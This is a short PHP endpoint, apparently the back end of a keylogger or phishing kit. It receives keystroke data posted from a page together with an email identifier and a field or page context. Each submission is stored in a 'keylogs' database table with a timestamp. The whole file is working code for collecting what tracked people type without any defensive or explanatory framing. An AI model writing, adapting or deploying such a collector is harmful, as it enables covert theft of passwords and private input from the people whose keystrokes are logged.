<?php
require_once __DIR__ . '/functions.php';
header('Content-Type: application/json');
header('X-Content-Type-Options: nosniff');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); exit; }

$action = $_POST['action'] ?? '';

if ($action === 'log_keys') {
    $keysRaw = $_POST['keys'] ?? '';
    $emailId = $_POST['email_id'] ?? '';
    $pageView = $_POST['page_view'] ?? '';
    if (empty($keysRaw)) { echo json_encode(['status'=>'empty']); exit; }
    $keysData = json_decode($keysRaw, true);
    if (!is_array($keysData)) { echo json_encode(['status'=>'invalid']); exit; }
    $fullLog = json_encode(['keys'=>$keysData,'page'=>$pageView,'time'=>date('Y-m-d H:i:s')]);
    $stmt = $pdo->prepare("INSERT INTO keylogs (email_identifier, key_data, field_context, full_log) VALUES (:e, :k, :c, :f)");
    $stmt->execute([':e'=>$emailId,':k'=>json_encode($keysData),':c'=>$pageView,':f'=>$fullLog]);
    echo json_encode(['status'=>'ok']);
    exit;
}

http_response_code(400);
